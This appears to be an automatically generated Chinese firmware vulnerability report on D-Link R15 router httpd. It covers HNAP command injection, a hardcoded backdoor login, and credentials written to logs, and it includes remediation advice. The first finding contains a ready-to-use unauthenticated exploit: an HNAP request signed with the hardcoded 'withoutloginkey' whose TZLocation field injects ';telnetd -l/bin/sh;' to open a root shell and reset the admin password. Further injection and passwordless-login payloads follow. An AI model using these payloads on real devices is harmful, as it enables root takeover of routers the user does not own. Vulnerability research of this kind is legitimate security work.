# 漏洞挖掘报告

> 会话 `s-mudoe515-e250` · 固件任务 `9160aafaa095` · 2026-09-23T06:10:11Z

## 一、任务信息

| 项 | 内容 |
| --- | --- |
| 任务目标 | 【交互纪律（必须遵守）】 1. 对用户只说简体中文——包括所有中间过程消息，一条英文都不许出现。 2. 每完成一组工具调用（最多两个），必须先用一两句中文向用户交代：刚才做了什么、结果是什么、接下来验证什么。长时间连续调用工具而一句话不说是违规。 3. 静态判定的最后一公里用 fw_read_bytes 直读 .data 决定性字节；未进代码图的二进制用 fw_decompile_single 单独反编译。 4. 禁止输出『建议的下一步』——所有下一步自己执行完。全部闭环后调用一次 fw_offer_emulation，按其返回指令用中文总结收尾（模拟询问由界面卡片呈现，不要写在报告里）。  挖掘未授权RCE漏洞 |
| 引擎 | dsh（模式：dynamic） |
| 轮次 | 2 / 81 |

## 二、发现统计

| 危害等级 | 数量 |
| --- | --- |
| **严重** | 1 |
| **高危** | 1 |
| **中危** | 2 |
| 合计 | 4 |

### 危害等级分布

```
  严重　 │█████████████·············  1
  高危　 │█████████████·············  1
  中危　 │██████████████████████████  2
```

### 可达性分布

```
  static-only │██████████████████████████  4
```

### 高频目标二进制 Top8

```
  httpd　　　　　　　　　　　　　　　│██████████████████████████  4
```

## 三、动态验证

- 摘录最近 13 条 trace，其中非空差分 0 条。

| Trace | 状态 | 入口 | 差分函数 | 备注 |
| --- | --- | --- | --- | --- |
| `b0b92b624b86` | failed | `net:80` | - | QemuError: target exited before port 11011 was ready (rc=125) |
| `0cbf6d44670d` | ok_empty_diff | `net:80` | 0 | - |
| `a55eabd4d91f` | ok_empty_diff | `net:80` | 0 | - |
| `81b17c135cf6` | ok_empty_diff | `net:80` | 0 | - |
| `49ee9cc34e5b` | ok_empty_diff | `net:80` | 0 | - |
| `78fed1ec8bbb` | ok_empty_diff | `net:80` | 0 | - |
| `8893a7ce0a65` | failed | `net:80` | - | QemuError: target exited before port 11001 was ready (rc=255) |
| `e59128b000e2` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-e59128b000e2-base.log: No such fil |
| `fff36e037aed` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fff36e037aed-base.log: No such fil |
| `fdac754d8326` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fdac754d8326-base.log: No such fil |
| `ce186bd5f812` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-ce186bd5f812-base.log: No such fil |
| `a36c86d9208b` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-a36c86d9208b-base.log: No such fil |
| `2f583960149b` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-2f583960149b-base.log: No such fil |

## 四、漏洞详情

### 漏洞 1：D-Link R15 httpd HNAP SetDeviceSettings 未授权命令注入（TZLocation 拼入 fota 命令串）（`F-mudp2pni-0d29`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 命令注入 `CWE-78` |
| 危害等级 | **严重**（置信度 0.7） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `save_CSID_SetDeviceSettings` @ `0x470f24` |
| 可达性 | static-only |

**漏洞描述**：httpd（80/tcp，HNAP/DHMAPI 协议）的 HNAP 动作 SetDeviceSettings 处理器 save_CSID_SetDeviceSettings 把请求参数 TZLocation 原样拼进 shell 命令串，经 libcsman 的 exec_cmd() 以 root 执行。TZLocation 在 sub_470D80 中仅被 snprintf(...,33,"%s") 拷贝，无任何字符过滤；处理器入口 sub_4716BC（SetDeviceSettings_put）不含任何会话/权限等级判断，而固件前端在“登录前”就用硬编码常量 withoutloginkey 签名调用该动作（首次配置向导设置管理员口令），因此未认证攻击者可直接注入命令。

**漏洞证据**：

1. sub_470F24 @0x470f24 伪C：v18=(char*)(a1+172); exec_cmd(...,"(fota -T %s; fota -I; fota -fQ) &", v18);（汇编 0x471238-0x471260 证实 _exec_cmd 的格式串与实参为结构体+0xAC；同函数 0x471094 另有 system("openssl passwd -5 -in /tmp/iii > /tmp/ooo; rm /tmp/iii")）
2. bin/httpd .rodata 0x4d0400-0x4d0600 实测字节含：'ws-hnap/SetDeviceSettings.c'、'(fota -T %s; fota -I; fota -fQ) &'、'openssl passwd -5 -in /tmp/iii > /tmp/ooo; rm /tmp/iii'、'24601'、'AdminPassword'、'ChangePassword'，证明命令串出厂即编译进固件
3. 参数装配 sub_470D80 @0x470d80：a2[5]（=TZLocation，由 sub_4714DC 的 'TZLocation' 元素值直接赋值）经 snprintf(a3+172,33,"%s",v12) 写入，无白名单；sub_4714DC @0x4714dc 亦未校验
4. 入口 sub_4716BC @0x4716bc 仅 sub_4714DC(a2,0,a3-1) 后设置 a1+272，全程无 session/authLevel 检查（对比同族 URL 处理器 sub_411FC8 @0x411fc8 会判定 a1[10]<4/7 并返回 401 'Page auth. is not enough'）
5. 未登录可达性证据（www UI）：js/SOAP/SOAPAction.js 中 k=sessionStorage.getItem('PrivateKey')，为 null 时 k='withoutloginkey'，HNAP_AUTH=hex_hmac_md5(k, 时间戳+SOAPAction)；js/wizard/wizardModel.js 的 storeWizDeviceInfo/storeWizOnlyDevicePasswordDeviceInfo 在首次配置向导中调用 sendSOAPAction('SetDeviceSettings', i(0,t)) 并携带 AdminPassword、ChangePassword=true、TZLocation
6. 同函数内第二条 shell 拼接：exec_cmd(...,"event_notifier 3001 \"U=0&Y=261&I=0&D=%s\"&", v26)，v26=sub_415DE4(DeviceName) 仅做 URL 编码（不转义双引号/空格/分号），但 DeviceName 先经 sub_416018→sub_415F98 黑名单（拒绝 &|\"`(){}$%;'\\）过滤，可达性低于 TZLocation 路径

**调用链**：

```
HTTP POST /HNAP1/ (SOAPAction: http://purenetworks.com/HNAP1/SetDeviceSettings) → sub_4716BC@0x4716bc (SetDeviceSettings_put) → sub_4714DC@0x4714dc (解析 DeviceName/AdminPassword/ChangePassword/TZLocation) → sub_470D80@0x470d80 (TZLocation→结构体+0xAC) → sub_470F24@0x470f24 (save_CSID_SetDeviceSettings) → _exec_cmd@0x471260 ("(fota -T %s; fota -I; fota -fQ) &") → libcsman.so exec_cmd → commander → system()（root）
```

**漏洞 PoC**：

```
1) 取秒级时间戳 T，令 ACTION="http://purenetworks.com/HNAP1/SetDeviceSettings"，HNAP_AUTH = uppercase(hex_hmac_md5("withoutloginkey", T + '"' + ACTION + '"')) + " " + T；2) 发送：POST /HNAP1/ HTTP/1.1 | Host: <router> | Content-Type: text/xml; charset=utf-8 | SOAPACTION: "http://purenetworks.com/HNAP1/SetDeviceSettings" | HNAP_AUTH: <上一步结果> | Content-Length: N | 空行 | <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/"><DeviceName>R15</DeviceName><AdminPassword>P@ssw0rd123</AdminPassword><ChangePassword>true</ChangePassword><TZLocation>;telnetd -l/bin/sh;</TZLocation></SetDeviceSettings></soap:Body></soap:Envelope>；3) 因 snprintf 限长 33 字节，TZLocation 用 20 字节的 ";telnetd -l/bin/sh;"，httpd 以 root 后台执行 (fota -T ;telnetd -l/bin/sh;; fota -I; fota -fQ) & ，即获得未授权 root shell（该请求同时把管理员口令改为 P@ssw0rd123，写入 csman 0x10002）。
```

**修复建议**：不要用 shell 拼接执行系统命令：fota 调用改为 execve 参数数组或把时区写入 csman 后由守护进程读取；对 TZLocation/DeviceName 做严格白名单（仅允许 IANA 时区字符集）并做 shell 转义；HNAP SetDeviceSettings 必须在处理器内校验会话/权限等级（与 sub_411FC8 的 authLevel 判定一致），仅在设备未完成初始配置时放行；移除前端硬编码 withoutloginkey 预登录签名密钥。


### 漏洞 2：httpd SetSysEmailSettings 邮件告警 shell 命令拼接（mailtool -v %s 单引号内注入点）（`F-mudp3nvt-918c`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 命令注入 `CWE-78` |
| 危害等级 | **高危**（置信度 0.5） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `?` @ `-` |
| 可达性 | static-only |

**漏洞描述**：httpd 的 SetSysEmailSettings 邮件告警模块用 shell 命令拼接终止 mailtool 进程，格式串为 "kill -9 $(ps ax| grep -v grep | grep 'mailtool -v %s' | awk '{print $1}');"，%s 直接落在单引号内。该字符串以明文字节存在于出厂固件 .rodata，属同一类未授权命令注入 sink，但流入 %s 的具体 HNAP 参数未在本次分析中闭合。

**漏洞证据**：

1. bin/httpd .rodata 0x4d0000-0x4d0200 实测字节含：'kill -9 $(ps ax| grep -v grep | grep \'mailtool -v %s\' | awk \'{print $1}\');'（%s 落在 shell 单引号内，可用单引号闭合后注入任意命令）、'kill -9 $(ps ax | grep -v grep | grep \'rlalert\' | awk \'{print $1}\'); rm -f /var/run/rlalert.pid;'、'rlalert -X'
2. 同一 .rodata 区块紧邻 'ws-hnap/SetSysEmailSettings.c'、'SetSysEmailSettings_get'、'SetSysEmailSettings_put'、'SetSysEmailSettingsResponse'/'SetSysEmailSettingsResult'，可确定该 %s 拼接属于 SetSysEmailSettings 动作的 mailtool/rlalert 进程管理代码，出厂固件即存在
3. 该动作与已确认可未认证调用的 SetDeviceSettings 属同一 ws-hnap 动作族（同族处理器 sub_4716BC @0x4716bc 无任何权限检查），存在同类未授权命令注入风险；本条未闭合处：流入 %s 的具体 HNAP 参数未在伪C中定位（httpd 内部调用边在代码图中缺失，call_trace 返回 0 调用者）

**调用链**：

```
HTTP POST /HNAP1/ (SOAPAction: SetSysEmailSettings) → HNAP 动作分发（.rodata 0x4c12b4 方法名表 process_method_hnap） → ws-hnap/SetSysEmailSettings.c 的 SetSysEmailSettings_put 处理器（地址未解析） → 命令拼接 "kill -9 $(ps ax| grep -v grep | grep 'mailtool -v %s' | awk '{print $1}');" → exec_cmd/system → shell（root）
```

**漏洞 PoC**：

```
静态复现：fw_read_bytes(binary_md5=b18be6d07f1c97903c063686924ed3c7, vaddr=0x4d0000, length=512) 可直接读出上述 shell 命令串原始字节。动态利用：解析出处理器地址后，按 SetSysEmailSettings 的 HNAP 报文（邮件账户/服务器等字段）填入如 a';telnetd -l/bin/sh;' 并观察 /var/run/rlalert.pid 与进程变化。
```

**修复建议**：进程管理改为按 pidfile / 精确进程名 kill，避免 shell 管道与通配；移除所有 shell 拼接，改为 execve 参数数组；对账户名等字段做白名单与 shell 转义。


### 漏洞 3：httpd HNAP Login 硬编码后门用户名 0A2326B60AB94BC 免密登录取会话（限 127.0.0.1 来源）（`F-mudp2qeq-dd51`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 认证绕过 `CWE-287` |
| 危害等级 | **中危**（置信度 0.65） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `sub_47B918` @ `0x47b918` |
| 可达性 | static-only |

**漏洞描述**：httpd 的 HNAP Login 处理器在解析 Username 后先与硬编码字符串 "0A2326B60AB94BC" 做 strncmp 前缀比对，命中且请求来源地址为 127.0.0.1 时直接跳到 LABEL_18 生成合法会话（Challenge/PublicKey/会话记录），完全不校验 LoginPassword。因比较长度取 strlen(输入)，输入为该字符串的任意前缀（含空用户名）即成立，属于固件内置的后门账号。

**漏洞证据**：

1. sub_47B918 @0x47b918 伪C：v19 = strlen(v15); if ( !strncmp(v15, "0A2326B60AB94BC", v19) ) { v74[0]=2130706433; if ( dword_4F0154 == 2130706433 ) { read_csman(...,-2147466621,v73,512,4); read_csman(*v21,66437,v75,17,4); goto LABEL_18; } return -401; }
2. strncmp 长度由 strlen(攻击者输入) 决定：输入为空串或 "0A" 等前缀同样返回 0，即后门匹配面比完整字符串更宽
3. 来源判定变量 dword_4F0154 由请求结构体填充：sub_470D14 @0x470d14 中 dword_4F0154 = *(_DWORD *)(a1+48)（即请求的客户端地址字段），因此后门仅对本机(127.0.0.1/0x7F000001)来源生效
4. LABEL_18 路径使用 csman 65538(0x10002 管理员口令) 与 66435 生成会话：sub_424384(...) 建立会话记录并 strcpy 私钥/口令字段，随后返回成功，无口令校验分支

**调用链**：

```
HTTP POST /HNAP1/ (SOAPAction: Login, Action=request, Username=0A2326B60AB94BC) → HNAP 动作分发（process_method_hnap，方法名表位于 .rodata 0x4c12b4） → sub_47B918@0x47b918 (Login 处理器) → 硬编码用户名比对命中 + dword_4F0154==127.0.0.1 → LABEL_18 → sub_423D34/sub_424384 生成会话与私钥 → 返回 Cookie/Challenge（免密）
```

**漏洞 PoC**：

```
T=秒级时间戳，ACTION='"http://purenetworks.com/HNAP1/Login"'，HNAP_AUTH=uppercase(hex_hmac_md5("withoutloginkey", T+ACTION))+" "+T；用 curl --interface 127.0.0.1 或从设备本机：POST /HNAP1/ 带 SOAPACTION: "http://purenetworks.com/HNAP1/Login"、HNAP_AUTH 头，体为 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>0A2326B60AB94BC</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>，响应返回非空 Challenge/Cookie/PublicKey 即证明未校验口令即签发会话。
```

**修复建议**：删除硬编码用户名字符串与对应免密分支；若为产线/救援用途，改为一次性随机令牌并强制校验口令与来源白名单，且不随量产固件发布。


### 漏洞 4：httpd 日志格式串明文输出 auth_pass / sess_prikey / dec_pass（`F-mudp3nws-4b3f`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 敏感信息泄露 `CWE-532` |
| 危害等级 | **中危**（置信度 0.5） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `?` @ `-` |
| 可达性 | static-only |

**漏洞描述**：httpd 内存在把管理员口令、HNAP 会话私钥与解密口令一并格式化的日志格式串 "auth_pass = %s\n sess_prikey= %s dec_pass =  %s\n"，以明文字节存在于出厂固件，属认证材料被打入日志的风险点（可能经日志接口/串口/syslog 服务器外泄）。

**漏洞证据**：

1. bin/httpd .rodata 0x4d0010-0x4d0050 实测字节：'auth_pass = %s\n sess_prikey= %s dec_pass =  %s\n'，即管理员认证口令、HNAP 会话私钥(PrivateKey)与解密口令被格式化进同一日志行
2. 该字符串与 'System Logs'、'ws-hnap/SetSysEmailSettings.c'、'SetSysEmailSettings_put' 同区块（自 0x4d0000 起），位于 HNAP 认证/邮件设置相关代码的 .rodata 池内，说明确为 httpd 认证路径的输出模板
3. 未闭合部分：未定位具体调用点（httpd 内部调用边在代码图缺失），故无法确认默认日志级别下是否落盘及是否可被未授权读取

**调用链**：

```
HNAP 认证/邮件设置路径 → httpd 日志调用（sub_49A624/sub_49A6D0 日志族） → 格式串 "auth_pass = %s\n sess_prikey= %s dec_pass =  %s\n" → 日志输出（syslog/文件）
```

**漏洞 PoC**：

```
静态复现：fw_read_bytes(binary_md5=b18be6d07f1c97903c063686924ed3c7, vaddr=0x4d0000, length=512) 读到 'auth_pass = %s / sess_prikey= %s / dec_pass = %s' 原始字节。动态验证：在真实设备触发一次 HNAP 登录后检查 /var/log 及 syslog 输出是否出现该行。
```

**修复建议**：删除该调试日志，或仅输出脱敏标识（长度/哈希前缀）；禁止把 auth_pass、sess_prikey 明文写入日志；发布版关闭调试日志宏。

